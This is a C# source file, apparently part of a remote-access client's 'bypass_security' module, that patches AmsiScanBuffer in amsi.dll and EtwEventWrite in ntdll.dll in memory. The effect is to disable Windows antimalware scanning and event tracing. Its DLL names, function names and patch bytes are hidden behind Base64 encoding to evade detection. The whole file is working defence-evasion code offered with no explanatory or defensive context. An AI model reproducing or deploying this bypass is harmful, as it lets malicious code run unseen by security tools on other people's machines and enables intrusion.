using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Client.bypass_security
{
    public class AmsiBypass
    {
        [DllImport("kernel32")]
        private static extern IntPtr GetProcAddress(
            IntPtr hModule,
            string procName);

        [DllImport("kernel32")]
        private static extern IntPtr LoadLibrary(
            string name);

        [DllImport("kernel32")]
        private static extern bool VirtualProtect(
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        public static void Edr()
        {
            var nameDllETw = "bnRkbGwuZGxs";
            var fonctionDllEtw = "RXR3RXZlbnRXcml0ZQ==";
            var x64PatchDllEtw = "SDPAww=="; //ToByte
            var x86PatchDllEtw = "M8DCFAA="; //ToByte
            var nameDllAmsi = "YW1zaS5kbGw=";
            var fonctionDllAmsi = "QW1zaVNjYW5CdWZmZXI=";
            var x64PatchDllAmsi = "uFcAB4DD"; //ToByte
            var x86PatchDllAmsi = "uFcAB4DCGAA="; //ToByte

            if (Is64Bit())
            {
                PatchMemory(DecodeBase64Str(nameDllAmsi), DecodeBase64Str(fonctionDllAmsi),
                    DecodeBase64Bytes(x64PatchDllAmsi));
                PatchMemory(DecodeBase64Str(nameDllETw), DecodeBase64Str(fonctionDllEtw),
                    DecodeBase64Bytes(x64PatchDllEtw));
            }
            else if (!Is64Bit())
            {
                PatchMemory(DecodeBase64Str(nameDllAmsi), DecodeBase64Str(fonctionDllAmsi),
                    DecodeBase64Bytes(x86PatchDllAmsi));
                PatchMemory(DecodeBase64Str(nameDllETw), DecodeBase64Str(fonctionDllEtw),
                    DecodeBase64Bytes(x86PatchDllEtw));
            }
        }

        private static void PatchMemory(string nameDll, string nameFonction, byte[] patch)
        {
            var library = LoadLibrary(nameDll);
            var procAddress = GetProcAddress(library, nameFonction);
            uint output;
            var vProtect = VirtualProtect(procAddress, (UIntPtr)patch.Length, 0x40, out output);
            Marshal.Copy(patch, 0, procAddress, patch.Length);
        }

        private static bool Is64Bit()
        {
            if (IntPtr.Size == 8) return true;

            return false;
        }

        private static string DecodeBase64Str(string input)
        {
            return Encoding.ASCII.GetString(Convert.FromBase64String(input));
        }

        private static byte[] DecodeBase64Bytes(string input)
        {
            return Convert.FromBase64String(input);
        }
    }
}